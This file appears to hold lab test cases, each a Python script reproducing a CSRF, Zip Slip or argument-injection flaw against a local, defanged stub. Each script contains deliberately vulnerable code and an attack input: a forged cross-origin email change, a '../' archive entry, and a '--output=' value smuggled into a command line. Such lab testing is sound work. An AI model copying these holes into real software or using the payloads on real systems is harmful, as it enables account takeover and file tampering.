C-csrf.name: CSRF: cross-origin state change with no token (local Flask-style stub)
C-csrf.authorization: Authorized lab/non-prod only, signed RoE. Local stub / owned assets only.
C-csrf.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY -- signed RoE. Local stub on 127.0.0.1 only.
# C-csrf: local HTTP stub with a state-changing POST that requires NO CSRF token.
import http.server, threading, urllib.request, urllib.parse

STATE = {"email": "victim@example.test"}

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n).decode()
        data = urllib.parse.parse_qs(body)
        # VULNERABLE: no CSRF token / no Origin check; cookie-only auth assumed
        if "email" in data:
            STATE["email"] = data["email"][0]
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")

def main():
    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    # Simulate a cross-origin forged request (no token, attacker-controlled Origin)
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}/account/email",
        data=urllib.parse.urlencode({"email": "attacker@evil.example.test"}).encode(),
        headers={"Origin": "http://evil.example.test", "Cookie": "session=FAKE-VICTIM-SESSION"})
    urllib.request.urlopen(req, timeout=3).read()
    srv.shutdown()
    if STATE["email"] == "attacker@evil.example.test":
        print("VULNERABLE: cross-origin POST changed account email with no CSRF token/Origin check")
    else:
        print("PASS: state-changing request was rejected")

if __name__ == "__main__":
    main()
C-csrf.success_criterion: A cross-origin POST with no CSRF token / no Origin check mutates account state (email changed).
C-csrf.cleanup: In-memory stub on an ephemeral port; thread + server stop on exit. No files written.
C-csrf.safety: Local-only: stub bound to 127.0.0.1 on an ephemeral port, defanged example.test identities.

C-slip.name: Zip Slip: archive entry escapes extraction root (local sandbox)
C-slip.authorization: Authorized lab/non-prod only, signed RoE. Local stub / owned assets only.
C-slip.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY -- signed RoE. Operates only inside a local temp sandbox.
# C-slip: zip extractor that follows ../ traversal entries (Zip Slip).
import zipfile, tempfile, os, io

def unsafe_extract(zf, dest):
    for name in zf.namelist():
        # VULNERABLE: joins entry name without normalizing/containment check
        target = os.path.join(dest, name)
        os.makedirs(os.path.dirname(target), exist_ok=True)
        with open(target, "wb") as f:
            f.write(zf.read(name))
        yield target

def main():
    base = tempfile.mkdtemp(prefix="slip_lab_")
    root = os.path.join(base, "extract_root"); os.makedirs(root)
    # Craft a malicious archive in-memory: entry escapes root into sibling dir
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("ok.txt", "benign")
        z.writestr("../pwned.txt", "FAKE-PAYLOAD-written-outside-root")
    buf.seek(0)
    escaped = False
    with zipfile.ZipFile(buf) as z:
        for written in unsafe_extract(z, root):
            real = os.path.realpath(written)
            if not real.startswith(os.path.realpath(root) + os.sep):
                escaped = True
                outside = real
    if escaped:
        print(f"VULNERABLE: archive entry escaped extraction root -> {outside}")
    else:
        print("PASS: all entries contained within extraction root")

if __name__ == "__main__":
    main()
C-slip.success_criterion: A crafted ../ entry is written outside the realpath of the extraction root.
C-slip.cleanup: All writes confined to a mkdtemp sandbox; remove the temp dir to clean up.
C-slip.safety: Local-only: in-memory crafted archive, extraction inside a throwaway temp sandbox.

C-arginj.name: Argument injection: leading-dash value reparsed as a flag (local subprocess)
C-arginj.authorization: Authorized lab/non-prod only, signed RoE. Local stub / owned assets only.
C-arginj.script:
#!/usr/bin/env python3
# AUTHORIZED LAB ONLY -- signed RoE. Local subprocess to a benign stub tool only.
# C-arginj: untrusted value placed in argv is reparsed as an option flag.
import subprocess, sys, tempfile, os

def main():
    d = tempfile.mkdtemp(prefix="arginj_lab_")
    # benign local "tool" that supports a --output flag (stand-in for a real CLI)
    tool = os.path.join(d, "tool.py")
    with open(tool, "w") as f:
        f.write(
            "import argparse,sys\n"
            "p=argparse.ArgumentParser()\n"
            "p.add_argument('--output',default='default.log')\n"
            "p.add_argument('name',nargs='?')\n"
            "a=p.parse_args()\n"
            "print('OUTPUT='+a.output)\n")
    # App intends: tool.py <user_name>. User controls name; supplies a leading-dash value.
    attacker_value = "--output=/tmp/arginj_lab_pwned"  # defanged, not actually written
    # VULNERABLE: value concatenated into argv with no '--' separator
    out = subprocess.run([sys.executable, tool, attacker_value],
                         capture_output=True, text=True).stdout.strip()
    if out == "OUTPUT=/tmp/arginj_lab_pwned":
        print(f"VULNERABLE: leading-dash arg reparsed as flag -> {out}")
    else:
        print(f"PASS: arg treated as positional data -> {out}")

if __name__ == "__main__":
    main()
C-arginj.success_criterion: A user-controlled value beginning with '--' is consumed as the tool's --output option.
C-arginj.cleanup: Benign stub tool written to a mkdtemp dir; no real output path is written; remove temp dir.
C-arginj.safety: Local-only: subprocess invokes a benign local stub; the injected path is defanged and never written.
